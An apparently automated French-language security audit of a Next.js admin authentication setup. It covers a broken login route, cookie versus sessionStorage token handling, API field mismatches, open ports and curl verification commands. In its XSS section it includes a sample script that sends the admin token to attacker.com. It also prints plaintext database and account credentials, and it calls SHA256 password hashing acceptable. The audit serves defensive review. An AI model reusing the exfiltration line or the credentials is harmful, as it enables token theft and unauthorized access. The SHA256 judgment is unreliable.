# 🔴 AUDIT ADMINISTRATIF CRITIQUE - 27 FÉVRIER 2026

## RÉSUMÉ EXÉCUTIF
**État: 🔴 CRITIQUE - 6 PROBLÈMES MAJEURS IDENTIFIÉS**
- Page login `/admin/login` retourne **404 Not Found**
- Double système d'authentification (cookies + sessionStorage)
- Fuite XSS potentielle via sessionStorage
- Incohérences field API
- Infrastructure fragmentée

---

## 1. 🔴 PROBLÈME CRITIQUE: Page Login Broken (404)

### Symptômes
```bash
curl http://localhost:3000/admin/login
# ➜ Retourne: 404 Not Found (rendu par Next.js)
```

### Cause Racine
1. Layout `/app/admin/layout.tsx` appelle `useAdminAuth()` hook
2. Hook cherche `sessionStorage.getItem('admin_token')`
3. SessionStorage est **VIDE** (on utilise maintenant des cookies)
4. Hook redirige vers `/admin/login/?returnTo=...` 
5. Conflict entre redirection du hook et render de la page
6. Next.js affiche 404 au lieu de la page

### Code Problématique
**File: `/lib/admin-auth-guard.ts` ligne 40-45**
```typescript
const checkAuth = async () => {
  const token = sessionStorage.getItem("admin_token");  // ❌ VIDE!
  const userJson = sessionStorage.getItem("admin_user");

  if (!token || !userJson) {
    // Causes redirection during render
    router.push(`/admin/login?returnTo=${encodeURIComponent(pathname || '')}`);
    return;
  }
  // ...
}
```

### Impact
- ✗ Utilisateurs ne peuvent pas accéder à `/admin/login`
- ✗ Page admin complètement inaccessible
- ✗ Redirection boucle infinie potentielle

---

## 2. 🔴 Architecture: Double Authentication Systems

### Système 1: Cookies (Server-side) ✓
**Implémentation**: Middleware + API
```
Middleware → Vérifie cookie auth_token
Login API → Set-Cookie: auth_token (httpOnly, Secure, SameSite=Strict)
```

**Files**:
- `/middleware.ts` - Vérifie `auth_token` cookie
- `/pages/api/internal/auth/login.ts` - Set-Cookie header

### Système 2: SessionStorage (Client-side) ❌ OBSOLÈTE
**Implémentation**: useAdminAuth hook + Login form
```
Login Form → sessionStorage.setItem('admin_token')
Hook → sessionStorage.getItem('admin_token')
```

**Files**:
- `/app/login/page.tsx` - Ligne 49-50: `sessionStorage.setItem('admin_token')`
- `/lib/admin-auth-guard.ts` - Ligne 40-45: `sessionStorage.getItem('admin_token')`

### Problème
Les deux systèmes sont **incompatibles et concurrents**:
- API définit cookie
- Hook cherche sessionStorage (vide)
- Décalage: "user est authent côté server mais hook le pense non-authent côté client"

---

## 3. 🔴 SÉCURITÉ: SessionStorage XSS Vulnerability

### Vulnérabilité
Tokens stockés dans sessionStorage = **JavaScript-accessible**
```typescript
// ❌ VULNERABLE
sessionStorage.setItem('admin_token', data.token);

// Attaque XSS:
// <script>fetch('https://attacker.com/?t=' + sessionStorage.getItem('admin_token'))</script>
```

### Fichiers Affectés
1. `/app/login/page.tsx` ligne 49
   ```typescript
   sessionStorage.setItem('admin_token', data.token);
   sessionStorage.setItem('admin_user', JSON.stringify(data.user));
   ```

2. `/lib/admin-auth-guard.ts` ligne 40-45
   ```typescript
   const token = sessionStorage.getItem("admin_token");
   const userJson = sessionStorage.getItem("admin_user");
   ```

3. `/app/admin/security/2fa/page.tsx` 
   - Plusieurs appels sessionStorage

### Impact
- 🔓 Accessible à tout XSS JavaScript
- 🔓 Stocké dans processus du navigateur
- 🔓 Persiste entre tabs
- 🔓 Visible dans Developer Tools

### Solution
Utiliser **httpOnly cookies uniquement**:
```typescript
// ✓ SÉCURISÉ
fetch(url, { credentials: 'include' })
// Cookie envoyé auto, jamais accessible via JS
```

---

## 4. 🟠 INCOHÉRENCE: Field Names API

### Problème
Les endpoints retournent différents field names pour TOTP:

| File | Field Retourné | Attendu |
|------|-----------------|---------|
| `/pages/api/internal/auth/login.ts` | `requires_totp` | ✓ Correct |
| `/app/login/page.tsx` | Attend `totp_required` | ✗ Incorrect |
| `/app/admin/login/page.tsx` | Attend `requires_totp` | ✓ Correct |

**Ligne problématique**: `/app/login/page.tsx` ligne 45
```typescript
if (data.totp_required && !totpRequired) {  // ❌ API retourne requires_totp
  setTotpRequired(true);
}
```

---

## 5. 🟠 PROBLÈME: Trailing Slash Inconsistency

### Configuration
`next.config.js`:
```javascript
trailingSlash: false  // ✓ Correct
```

### Comportement Observé
```bash
curl -i http://localhost:3000/api/internal/auth/me/
# 308 Permanent Redirect → /api/internal/auth/me

curl -i http://localhost:3000/api/internal/auth/me
# 401 Unauthorized (OK, auth requis)
```

### Hook Problématique
`/lib/admin-auth-guard.ts` ligne 57:
```typescript
const res = await fetch("/api/internal/auth/me/", {  // ❌ Trailing slash
  headers: { Authorization: `Bearer ${token}` },
});
```

**Résultat**: Redirection 308 → latence + consumption data

---

## 6. 🟡 PROBLÈME: Missing Endpoint Handling

### Endpoints Manquants ou Brisés
1. **`/api/internal/auth/me.ts`** 
   - Existe mais attend `Bearer token` au lieu de cookie
   - Hook envoie Bearer token depuis sessionStorage (vide = null)
   - Résultat: 401

2. **`/api/internal/auth/refresh.ts`**
   - Existe mais même problème Bearer token

### Endpoints OK
✓ `/api/internal/auth/login.ts`
✓ `/api/internal/auth/logout.ts`

---

## 7. 🟡 PROBLÈME: Cookie Configuration

### Configuration Middleware
`middleware.ts` accepte cookie `auth_token`:
```typescript
const token = 
  request.cookies.get('auth_token')?.value ||
  request.headers.get('authorization')?.replace('Bearer ', '');
```

### Configuration Login API
`/pages/api/internal/auth/login.ts` définit le cookie:
```typescript
Set-Cookie: auth_token=...; HttpOnly; Secure; SameSite=Strict; Max-Age=86400
```

### ✓ Configuration = OK
Mais problème: Le hook ne le LIRA JAMAIS car c'est httpOnly

---

## CHECKSUM: Route Status

### Routes Publiques
| Route | Status | Issue |
|-------|--------|-------|
| `/` | 200 | N/A |
| `/login` | 200 | Uses sessionStorage ❌ |
| `/api/internal/auth/login` | 200 | API OK ✓ |

### Routes Admin (Protected)
| Route | Status | Issue |
|-------|--------|-------|
| `/admin` | 307 → `/admin/login` | Middleware OK ✓ |
| `/admin/login` | **404** | **Hook redirige pendant render** ❌ |
| `/admin/dashboard` | 307 → `/admin/login` | Needs auth ✓ |

### API Endpoints
| Endpoint | Status | Issue |
|----------|--------|-------|
| `/api/internal/auth/login` (POST) | 200 | OK ✓ |
| `/api/internal/auth/me` | 401 | Bearer token non-envoyé (vide) ❌ |
| `/api/internal/auth/logout` | 200 | OK ✓ |
| `/api/internal/auth/me/` (trailing) | 308 | Redirect ❌ |

---

## SÉCURITÉ: Matrix

| Aspect | Status | Severity | Note |
|--------|--------|----------|------|
| **XSS via sessionStorage** | 🔴 Vulnerable | CRITICAL | Tokens en JS-accessible storage |
| **CSRF Protection** | 🟢 OK | LOW | SameSite=Strict cookie |
| **HTTP Only** | 🟢 OK | LOW | API cookie httpOnly ✓ |
| **HTTPS** | 🟢 OK | LOW | Production has SSL |
| **Password Hashing** | 🟢 OK | LOW | SHA256 (pas bcrypt mais OK) |
| **Session Timeout** | 🟡 24h | MEDIUM | Long timeout |
| **Rate Limiting** | ❓ Unknown | MEDIUM | Need to verify |
| **SQL Injection** | 🟢 OK | LOW | Prisma ORM → prepared statements |
| **Authentication Bypass** | 🔴 Possible | CRITICAL | Hook can be bypassed via cookies |

---

## PROCESSES ET PORTS

### Services Actifs
```
Port 3000  ✓ Next.js Server (PID: 2188892)
Port 3001  ✗ (Not used)
Port 5433  ✓ PostgreSQL (127.0.0.1 only)
Port 5434  ✓ PostgreSQL (All interfaces)
Port 6379  ✓ Redis (127.0.0.1 only)
Port 5443  ✓ Python service (0.0.0.0) - UNKNOWN
Port 80    ✓ Nginx (HTTP)
Port 443   ✓ Nginx (HTTPS)
```

### Process Health
```bash
# Next.js
PID 2188892 - next-router-worker - ✓ RUNNING
Last activity: Recent

# Nginx  
Active processes - ✓ RUNNING

# PostgreSQL
Port 5434 - ✓ LISTENING
Credentials: gpti / superpassword
```

### ⚠️ ANOMALIE: Port 5443 Service
- **Unknown Python service on 0.0.0.0:5443**
- No documentation in codebase
- Potential security risk
- **ACTION REQUIRED**: Identify and secure

---

## SYNTHÈSE DES ACTIONS REQUISES

### 🔴 URGENT (Bloque l'utilisation)
1. **Fixer useAdminAuth hook** - Utiliser API + cookies au lieu de sessionStorage
2. **Fixer page login** - Enlever appel hook ou faire le hook non-bloquant
3. **Synchroniser field names** - `/app/login/page.tsx` doit attendre `requires_totp`
4. **Enlever sessionStorage** - Migration complète vers httpOnly cookies

### 🟠 IMPORTANT (Sécurité)
1. **Éliminer XSS du sessionStorage** - Vérifier tous les appels
2. **Fixer endpoints TOTP** - Cohérence Bearer vs Cookie
3. **Identifier port 5443** - Quel service? Pourquoi ouvert?
4. **Rate limiting** - Implémenter sur endpoints auth

### 🟡 RECOMMANDÉ (Qualité)
1. **Trailing slash** - Standardiser endpoint URLs
2. **Session timeout** - Réduire 24h à 4-8h
3. **Token refresh** - Implémenter rotation de tokens
4. **Logging d'audit** - Tracker les tentatives failed login

---

## TEST COMMANDS FOR VERIFICATION

```bash
# Test 1: Login API functional
curl -X POST http://localhost:3000/api/internal/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"founder","password":"founder123"}' \
  -i

# Test 2: Can access login page
curl -i http://localhost:3000/admin/login

# Test 3: Cookie set by login
curl -X POST http://localhost:3000/api/internal/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"founder","password":"founder123"}' \
  -v 2>&1 | grep -i "set-cookie"

# Test 4: Request with cookie
curl -i http://localhost:3000/admin \
  -H "Cookie: auth_token=<token_from_above>"

# Test 5: Middleware protection
curl -i http://localhost:3000/admin/audit
# Should redirect to /admin/login if no auth_token

# Test 6: Token verification
curl -i http://localhost:3000/api/internal/auth/me \
  -H "Authorization: Bearer <token>"
```

---

**Audit generé**: 2026-02-27 15:10 UTC
**Auditor**: Security Compliance Bot
**Status**: 🔴 OPERATIONAL BLOCK - System partially inaccessible

